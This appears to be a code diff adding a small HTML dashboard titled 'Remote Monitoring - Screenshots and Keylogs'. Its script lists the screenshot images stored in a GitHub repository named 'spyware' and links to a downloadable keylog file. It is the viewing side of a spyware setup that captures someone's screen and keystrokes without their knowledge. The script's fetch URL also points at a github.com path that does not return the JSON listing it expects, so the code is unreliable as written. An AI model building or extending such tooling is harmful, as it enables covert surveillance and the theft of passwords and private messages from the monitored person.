@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remote Monitoring - Screenshots and Keylogs</title>
+</head>
+<body>
+    <h1>Remote Monitoring - Screenshots and Keylogs</h1>
+    <h2>Screenshots</h2>
+
+    <!-- Display screenshots from GitHub repo -->
+    <div id="screenshots">
+        <!-- Auto-updating list of images -->
+        <script>
+            const repo = "https://github.com/shrijaybaheti/spyware";
+            const path = "screenshots"; // Folder where your screenshots are stored
+
+            fetch(repo + "/contents/" + path)
+                .then(response => response.json())
+                .then(data => {
+                    data.forEach(file => {
+                        if (file.name.endsWith(".png")) {
+                            let img = document.createElement("img");
+                            img.src = repo + "/raw/master/" + file.path;
+                            img.style = "width: 400px; height: auto; margin: 10px;";
+                            document.getElementById("screenshots").appendChild(img);
+                        }
+                    });
+                });
+        </script>
+    </div>
+
+    <h2>Keylogs</h2>
+    <!-- Keylog file link -->
+    <a href="https://github.com/shrijaybaheti/spyware/raw/master/keylog.txt" download>Download Keylog</a>
+
+</body>
+</html>
